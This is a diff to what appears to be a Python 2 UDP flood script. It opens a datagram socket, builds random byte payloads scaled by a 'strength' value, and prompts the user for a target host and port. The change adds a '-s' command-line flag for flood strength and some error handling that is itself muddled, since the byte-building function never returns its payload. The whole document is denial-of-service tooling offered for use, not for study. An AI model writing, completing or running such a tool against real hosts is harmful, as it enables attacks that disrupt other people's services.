@@ -11,10 +11,23 @@ def credits():
 	console.set_color(130, 0, 0)
 	print "     -+--=:=-  -++-  -=:=--+-\n"
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+stop = False
+for i in sys.argv:
+	if i == "-s":
+		stop = True
+	else:
+		if stop:
+			strength = i
+			break
+print strength
 def byt(strength):
 	bytes = random._urandom(1024) * int(strength)
-if len(str(strength)) == 0:
-	byt(8)
+try:
+	if len(str(strength)) == 0:
+		byt(8)
+except:
+	byt(strength)
+	pass
 credits()
 victim = raw_input(' -+- Target: ')
 vport = input(' -+- Port: ')
